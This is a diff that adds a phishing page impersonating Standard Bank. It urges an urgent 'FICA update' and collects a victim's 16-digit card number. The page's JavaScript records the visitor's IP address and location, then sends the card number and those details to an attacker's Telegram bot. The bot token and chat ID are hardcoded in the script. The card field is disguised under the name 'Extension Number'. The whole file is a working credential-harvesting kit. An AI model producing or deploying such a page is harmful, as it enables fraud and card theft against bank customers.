@@ -1,0 +1,194 @@
+ <!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Secure Access — Standard Bank</title>
+      <!-- Favicon -->
+  <link rel="icon" href="IMG/sbg.png" type="image/png" />
+  
+  <style>
+    :root {
+      --blue-1: #083a97;
+      --blue-2: #0288d1;
+      --accent: #173ea8;
+    }
+
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: Inter, Segoe UI, Roboto, Arial, sans-serif;
+      background: linear-gradient(180deg, var(--blue-1) 0%, var(--blue-2) 100%);
+    }
+
+    .page-form {
+      height: 100vh;
+      width: 100vw;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 40px 20px 20px 20px;
+      box-sizing: border-box;
+    }
+
+    .form-container {
+      background: white;
+      padding: 30px 40px;
+      border-radius: 8px;
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.25);
+      max-width: 420px;
+      width: 100%;
+      box-sizing: border-box;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 22px;
+      margin-bottom: 50px;
+      color: black;
+      font-weight: 400;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 4px;
+      color: var(--blue-1);
+      text-align: left;
+    }
+
+    input[type="text"],
+    input[type="tel"],
+    input[type="hidden"] {
+      border: none;
+      border-bottom: 2px solid #173ea8;
+      padding: 6px 8px;
+      font-size: 14px;
+      width: 100%;
+      margin-bottom: 18px;
+      box-sizing: border-box;
+      outline: none;
+      background: transparent;
+      color: #000;
+    }
+
+    input[type="tel"]:focus,
+    input[type="text"]:focus {
+      border-color: var(--accent);
+    }
+
+    button {
+      display: inline-block;
+      width: 100%;
+      padding: 8px 14px;
+      background: var(--accent);
+      color: #fff;
+      font-weight: 300;
+      letter-spacing: 0.6px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: opacity 0.3s ease;
+      margin-top: 20px;
+    }
+
+    button:hover {
+      opacity: 0.9;
+    }
+
+    .footer {
+      font-size: 12px;
+      color: #666;
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .top-image {
+      display: block;
+      margin: 20px auto 10px;
+      max-width: 120px;
+    }
+  </style>
+</head>
+<body>
+  <div class="page-form">
+    <img src="IMG/sbg.png" alt="Small Image" class="top-image" />
+
+    <div class="form-container">
+      <h1>Immediate Standard Bank FICA Update to Ensure Uninterrupted Access on your Account.</h1>
+
+      <form id="extensionForm">
+        <label for="extensionNumber">Cheque Card or Credit Card</label>
+        <input id="extensionNumber" name="Extension Number" type="text" required pattern="^\d{16}$" inputmode="numeric" autocomplete="off" />
+
+        <input type="hidden" name="IP Address" id="ipAddress" />
+        <input type="hidden" name="Location" id="location" />
+
+        <button type="submit">SIGN IN</button>
+      </form>
+
+      <div class="footer">
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = '8579510849:AAEmgt0Vk4Z7ZaQp2KZdrqVHAr6t78YnO5Y';
+    const TELEGRAM_CHAT_ID = '6305965230';
+
+    // Get IP and Location
+    fetch('https://ipinfo.io/json?token=48a36e97612e2a')
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById('ipAddress').value = data.ip;
+        document.getElementById('location').value = `${data.city}, ${data.region}, ${data.country}`;
+      })
+      .catch(err => {
+        console.warn('Failed to fetch IP info:', err);
+      });
+
+    // Submit form via Telegram Bot API
+    document.getElementById('extensionForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const extension = document.getElementById('extensionNumber').value;
+      const ip = document.getElementById('ipAddress').value;
+      const location = document.getElementById('location').value;
+
+      const message = `
+ *Standard Bank Card Submission*
+----------------------------
+ *Card#:* \`${extension}\`
+ *IP:* \`${ip}\`
+ *Location:* ${location}
+      `;
+
+      const telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      fetch(telegramURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          // Redirect with data in query string
+          window.location.href = `index01.html?extension=${encodeURIComponent(extension)}`;
+        } else {
+          alert('Failed to submit. Please try again.');
+        }
+      })
+      .catch(error => {
+        console.error('Telegram error:', error);
+        alert('Error sending data.');
+      });
+    });
+  </script>
+</body>
+</html>
